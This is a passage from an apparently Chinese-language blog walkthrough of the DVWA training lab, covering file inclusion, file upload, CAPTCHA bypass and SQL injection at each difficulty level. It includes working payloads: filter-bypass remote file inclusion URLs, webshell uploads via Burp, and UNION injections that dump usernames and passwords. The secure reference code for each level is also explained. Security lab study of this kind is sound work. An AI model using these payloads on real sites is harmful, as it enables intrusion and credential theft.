src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20114353.png" alt="屏幕截图 2024-02-23 114353"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20114410.png" alt="屏幕截图 2024-02-23 114410"></p><h3 id="4-Impossible-2"><a href="#4-Impossible-2" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223114601749.png" alt="image-20240223114601749"></p><p>此关代码利用PDO技术防御SQL注入 又要求用户输入原始密码来防止CSRF攻击者在不知道原始密码的情况下无论如何都无法进行CSRF攻击</p><h2 id="四、File-Inclusion"><a href="#四、File-Inclusion" class="headerlink" title="四、File Inclusion"></a>四、File Inclusion</h2><p><strong>什么是文件包含漏洞：</strong></p><p>简单的来说就是服务器通过php的特性（函数的特性）去包含任意文件时，由于对包含的这个文件来源过滤不严，从而可去包含一个恶意的文件，而我们构造的这个恶意的文件来达到的目的</p><p><strong>函数</strong>：allow_url_fopen，allow_url_include开启</p><p>在phpstudy中</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20143028.png" alt="屏幕截图 2024-02-21 143028"></p><p>allow_url_fopen &#x3D; On</p><p><strong>允许将URL（如http：&#x2F;&#x2F;或ftp：&#x2F;&#x2F;）作为文件处理</strong></p><p>allow_url_include &#x3D; On</p><p><strong>允许include&#x2F;require打开URL（如http：&#x2F;&#x2F;或ftp：&#x2F;&#x2F;）作为文件处理</strong></p><h3 id="1-Low-3"><a href="#1-Low-3" class="headerlink" title="1.Low"></a>1.Low</h3><p>我们可以先看源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20145245.png" alt="屏幕截图 2024-02-21 145245"></p><p>我们发现它没有做任何过滤通过get方式提交</p><p>然后就可以在地址栏的位置输入一个文件地址</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20145027.png" alt="屏幕截图 2024-02-21 145027"></p><p>如上图所示成功利用文件包含漏洞</p><p>然后我们就可以看到php配置的相关信息</p><h3 id="2-Medium-3"><a href="#2-Medium-3" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240221145725157.png" alt="image-20240221145725157"></p><p>此关对传入的参数进行了过滤过滤掉了</p><p><code>http://            https://                ../                ..\\</code></p><p>以上四个字符串</p><p><strong>本地文件包含：</strong></p><p>但是不影响我们使用本地的路径来包含文件</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20150329.png" alt="屏幕截图 2024-02-21 150329"><strong>远程文件包含</strong></p><p>再看远程文件包含，过滤了 <code>http://</code> 和 <code>https://</code>，因为使用的是 str_replace 替换为空，所以这里可以使用常规套路，就是嵌套双写绕过。具体的 payload 如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/fi/</span>?page=hhttps:<span class="hljs-regexp">//</span>ttps:<span class="hljs-regexp">//</span>www.sqlsec.com/info.txt<br></code></pre></td></tr></table></figure><p>str_replace 函数处理之后就变成了如下情况：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/fi/</span>?page=https:<span class="hljs-regexp">//</span>www.sqlsec.com/info.txt<br></code></pre></td></tr></table></figure><p>又因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/fi/<span class="hljs-string">?p</span>age=<span class="hljs-variable constant_">HTTPS</span><span class="hljs-symbol">://www</span>.sqlsec.com/info.txt<br></code></pre></td></tr></table></figure><h3 id="3-High-3"><a href="#3-High-3" class="headerlink" title="3.High"></a>3.High</h3><p>首先查看源代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20152556.png" alt="屏幕截图 2024-02-21 152556"></p><p>以上代码要求我们传入的参数必须要以file开头而且不能是include.php才能包含文件</p><p>这里刚好可以使用 file:&#x2F;&#x2F; 协议来进行文件读取</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20152342.png" alt="屏幕截图 2024-02-21 152342"></p><p><strong>注：</strong>“file:&#x2F;&#x2F;“是统一资源定位符（URL）中的协议部分，用于指示文件系</p><p>统路径。在这种URL中，”file:&#x2F;&#x2F;“后面紧跟着文件的绝对路径，例如”D:\phpstudy_pro\WWW\file phpinfo().php”。这种URL格式通常用于指向本地文件系统中的文件，而不是通过网络访问的文件</p><h3 id="4-Impossible-3"><a href="#4-Impossible-3" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>然后我们看一下安全的情况是如何构成的</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240221153230216.png" alt="image-20240221153230216"></p><p>这其实就是一个白名单</p><p>只允许包含指定的这几个php文件其他的就不行</p><h2 id="五、File-Upload"><a href="#五、File-Upload" class="headerlink" title="五、File Upload"></a>五、File Upload</h2><h3 id="1-Low-4"><a href="#1-Low-4" class="headerlink" title="1.Low"></a>1.Low</h3><p>随便上传一个文件，我们发现图片PNG格式是可以的，继续，PHP格式</p><p>发现也是可以的</p><p>那我们可以直接上传一句话木马</p><p>然后使用蚁剑连接便可以获取服务器的所有文件信息</p><h3 id="2-Medium-4"><a href="#2-Medium-4" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240221160611541.png" alt="image-20240221160611541"></p><p>我们发现这一关只允许上传JPEG和PNG文件</p><p>但是我们可以先将我们php文件的后缀更改为png后再在上传时通过bp改成php即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20163022.png" alt="屏幕截图 2024-02-21 163022"></p><p>上传成功</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20162956.png" alt="屏幕截图 2024-02-21 162956"></p><p>再访问到对应的文件看看是否正常</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20163250.png" alt="屏幕截图 2024-02-21 163250"></p><h3 id="3-High-4"><a href="#3-High-4" class="headerlink" title="3.High"></a>3.High</h3><p>这一关不仅对文件格式有限制它对文件大小也进行了限制</p><p>我们可以通过制作图片码的方式来传马</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20193150.png" alt="屏幕截图 2024-02-21 193150"></p><p>然后我们将2.png传入即可</p><p>然后我们进入到Low等级的文件包含中打开我们的文件即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20200114.png" alt="屏幕截图 2024-02-21 200114"></p><h3 id="4-Impossible-4"><a href="#4-Impossible-4" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 检查是否点击了名为&#x27;Upload&#x27;的按钮</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br><span class="hljs-comment">// 检查令牌，确保请求是合法的</span><br><span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br><span class="hljs-comment">// 获取上传文件的信息，包括文件名、扩展名、大小、类型和临时路径</span><br><span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ]; <span class="hljs-comment">// 获取上传文件的名称</span><br><span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>); <span class="hljs-comment">// 获取文件扩展名</span><br><span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ]; <span class="hljs-comment">// 获取上传文件的大小</span><br><span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ]; <span class="hljs-comment">// 获取上传文件的类型</span><br><span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ]; <span class="hljs-comment">// 获取临时文件路径</span><br><br><span class="hljs-comment">// 定义上传文件的目标路径和文件名，并生成临时文件名</span><br><span class="hljs-variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;hackable/uploads/&#x27;</span>;<br><span class="hljs-variable">$target_file</span>   =  <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>; <span class="hljs-comment">// 生成唯一的目标文件名</span><br><span class="hljs-variable">$temp_file</span>     = ( ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="hljs-string">&#x27;&#x27;</span> ) ? ( <span class="hljs-title function_ invoke__">sys_get_temp_dir</span>() ) : ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) ) );<br><span class="hljs-variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>; <span class="hljs-comment">// 生成唯一的临时文件名</span><br><br><span class="hljs-comment">// 检查上传文件是否为图片，并满足特定条件（如文件类型、大小等）</span><br><span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpeg&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;<br>( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span> ) &amp;&amp;<br><span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br><br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> ) &#123;<br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br><span class="hljs-title function_ invoke__">imagejpeg</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">100</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br><span class="hljs-title function_ invoke__">imagepng</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">9</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">imagedestroy</span>( <span class="hljs-variable">$img</span> );<br><br><span class="hljs-comment">// 将文件从临时文件夹移动到Web根目录</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">rename</span>( <span class="hljs-variable">$temp_file</span>, ( <span class="hljs-title function_ invoke__">getcwd</span>() . DIRECTORY_SEPARATOR . <span class="hljs-variable">$target_path</span> . <span class="hljs-variable">$target_file</span> ) ) ) &#123;<br><span class="hljs-comment">// 文件成功上传</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;a href=&#x27;<span class="hljs-subst">&#123;$target_path&#125;</span><span class="hljs-subst">&#123;$target_file&#125;</span>&#x27;&gt;<span class="hljs-subst">&#123;$target_file&#125;</span>&lt;/a&gt; 上传成功！&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 文件上传失败</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;您的图片未上传。&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// 删除任何临时文件</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$temp_file</span> ) )<br><span class="hljs-title function_ invoke__">unlink</span>( <span class="hljs-variable">$temp_file</span> );<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 无效的文件类型</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;您的图片未上传。我们只接受JPEG或PNG图片。&lt;/pre&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 生成令牌</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>文件名随机这里就无法使用截断、重写图片的话，使用图马就也无法绕过</p><p>而且也使用了Token</p><h2 id="六、Insecure-CAPTCHA"><a href="#六、Insecure-CAPTCHA" class="headerlink" title="六、Insecure CAPTCHA"></a>六、Insecure CAPTCHA</h2><h3 id="1-Low-5"><a href="#1-Low-5" class="headerlink" title="1.Low"></a>1.Low</h3><p>经过对源码的分析可知</p><p>更改密码分为两个部分step 1为验证码并不显示出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">recaptcha_check_answer</span>(<br><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;recaptcha_private_key&#x27;</span>],<br><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span>]<br>);<br></code></pre></td></tr></table></figure><ul><li><code>recaptcha_check_answer</code> 函数是用于验证用户提交的 reCAPTCHA 响应是否正确的函数。</li><li>它接受两个参数：<ol><li><code>$_DVWA[&#39;recaptcha_private_key&#39;]</code>：这是您的 reCAPTCHA 私钥，用于验证用户提交的 reCAPTCHA 响应。</li><li><code>$_POST[&#39;g-recaptcha-response&#39;]</code>：这是用户在 reCAPTCHA 验证中生成的响应，用于验证用户是否通过了 reCAPTCHA 验证。</li></ol></li><li>函数返回一个响应对象 <code>$resp</code>，该对象包含了验证结果以及可能的错误信息。</li></ul><p>在这段代码中，<code>$resp</code> 变量将包含 reCAPTCHA 验证的结果，您可以根据这个结果来决定用户是否通过了 reCAPTCHA 验证，并相应地执行后续的操作，比如允许用户提交表单或者拒绝提交等。</p><p>需要注意的是，reCAPTCHA 是谷歌提供的一种验证码服务，用于防止恶意机器人提交表单或进行恶意操作。通过调用 <code>recaptcha_check_answer</code> 函数来进行人机验证</p><p>step 2为更改密码</p><p>我们可以直接跳转到step 2来跳过验证码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20204255.png" alt="屏幕截图 2024-02-21 204255"></p><p>改完后发包即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20204815.png" alt="屏幕截图 2024-02-21 204815"></p><h3 id="2-Medium-5"><a href="#2-Medium-5" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>此关与上一关的不同点是在step 2中检查用户是否通过了CAPTCHA验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( !<span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;passed_captcha&#x27;</span> ] ) &#123;<br><span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;<br><span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>只有返回值为ture时才能修改</p><p>所以我们使用bp抓包改包时要在上一关的基础上再加上passed_captcha&#x3D;ture</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20210116.png" alt="屏幕截图 2024-02-21 210116"></p><p>然后发送改好的包即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20210200.png" alt="屏幕截图 2024-02-21 210200"></p><h3 id="3-High-5"><a href="#3-High-5" class="headerlink" title="3.High"></a>3.High</h3><p>由源码可知这一关对于验证和密码更改没有分开</p><p>以下代码便是我们的突破点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<br><span class="hljs-variable">$resp</span> || <br>(<br><span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="hljs-string">&#x27;hidd3n_valu3&#x27;</span><br>&amp;&amp; <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="hljs-string">&#x27;reCAPTCHA&#x27;</span><span class="hljs-comment">//用于检查用户的浏览器代理字符串是否为 &#x27;reCAPTCHA&#x27;这个条件语句通常用于在服务器端验证请求是否来自reCAPTCHA服务</span><br>)<br>)<br></code></pre></td></tr></table></figure><p>我们可以进行伪造绕过$resp没有办法改变是服务器给的key但是我们可以伪造g-recaptcha-response&#x3D;hidd3n_valu3</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20212431.png" alt="屏幕截图 2024-02-21 212431"></p><p>改完发送即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20212457.png" alt="屏幕截图 2024-02-21 212457"></p><h3 id="4-Impossible-5"><a href="#4-Impossible-5" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>　Impossible级别的代码增加token机制防御CSRF攻击</p><p>利用PDO技术防护sql注入且验证过程不再分成两部分了</p><p>同时要求用户输入之前的密码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20212651.png" alt="屏幕截图 2024-02-21 212651"></p><h2 id="七、SQL-Injection"><a href="#七、SQL-Injection" class="headerlink" title="七、SQL Injection"></a>七、SQL Injection</h2><h3 id="1-Low-6"><a href="#1-Low-6" class="headerlink" title="1.Low"></a>1.Low</h3><p>首先查看注入点</p><p> 1’   – asd</p><p>然后猜字段</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20213231.png" alt="屏幕截图 2024-02-21 213231"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20213222.png" alt="屏幕截图 2024-02-21 213222"></p><p>由图可知存在两个字段</p><p>然后显示报错位</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20214110.png" alt="屏幕截图 2024-02-21 214110"></p><p>由图可知1 2均可显示出来</p><p>然后查找库名</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20214308.png" alt="屏幕截图 2024-02-21 214308"></p><p>然后查找库里的表名</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20215701.png" alt="屏幕截图 2024-02-21 215701"></p><p>然后查找user表里的字段</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20215714.png" alt="屏幕截图 2024-02-21 215714"></p><p>然后查找password的数据</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20215540.png" alt="屏幕截图 2024-02-21 215540"></p><h3 id="2-Medium-6"><a href="#2-Medium-6" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>此看完源代码后发现它对特殊字符进行了转义</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20124526.png" alt="屏幕截图 2024-02-22 124526"></p><p>而且在页面只能通过下拉菜单栏的方式来选择要输入的ID</p><p>因此我们可以选择通过使用burp改包的方式来传入我们想要输入的数据</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20115212.png" alt="屏幕截图 2024-02-22 115212"></p><p>先尝试是否存在注入</p><p>1 and 1&#x3D;1 –asd</p><p>如图:</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20115221.png" alt="屏幕截图 2024-02-22 115221"></p><p>说明存在然后我们尝试找显错位发现单引号会被转义</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20115355.png" alt="屏幕截图 2024-02-22 115355"></p><p>然后猜字段最终判断存在2个字段</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>order by <span class="hljs-number">5</span> -- asd<br><span class="hljs-symbol">1 </span>order by <span class="hljs-number">3</span> -- asd<br><span class="hljs-symbol">1 </span>order by <span class="hljs-number">2</span> -- asd<br></code></pre></td></tr></table></figure><p>显示报错位</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span> -- asd<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20125540.png" alt="屏幕截图 2024-02-22 125540"></p><p>查找库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- sd</span><br></code></pre></td></tr></table></figure><p>查找当前数据库中的表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- sd</span><br></code></pre></td></tr></table></figure><p>查找表users中的字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x27757365727327</span> <span class="hljs-comment">-- sd</span><br></code></pre></td></tr></table></figure><p>查找字段中的数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>),group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- sd</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20130500.png" alt="屏幕截图 2024-02-22 130500"></p><h3 id="3-High-6"><a href="#3-High-6" class="headerlink" title="3.High"></a>3.High</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20131026.png" alt="屏幕截图 2024-02-22 131026"></p><p>这一关使用了session会话的方式来获取ID其他的跟Low没什么不同</p><p>直接在框里提交即可都不需要使用burp</p><p>如图：<br><img 